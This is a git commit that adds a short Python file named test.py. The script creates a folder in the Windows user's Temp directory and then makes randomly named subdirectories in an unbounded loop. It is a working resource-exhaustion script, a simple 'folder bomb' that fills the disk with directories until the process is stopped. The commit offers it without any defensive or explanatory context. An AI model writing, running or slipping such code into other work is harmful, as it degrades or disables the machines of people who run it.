0dcde2d62947cd7f30b4b5b76604ef7bb90776fa
thompogalt <thomaseduard@outlook.dk>
2026-07-01 14:14:38 +0000

    new file:   test.py

---
+++ test.py
@@ -0,0 +1,22 @@
+from os.path import exists as exist
+import os
+import getpass
+from random import randint
+
+user = getpass.getuser()
+main = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\temp_machen"
+
+if not exist(main):
+    os.mkdir(main)
+
+os.chdir(main)
+
+def make_newmains(main: str) -> str:
+    if main is None:
+        return "none"
+    
+    return main + f"{randint(0, 999999999)}"
+
+while True:
+    os.mkdir(make_newmains(main))
+    print("new main made")
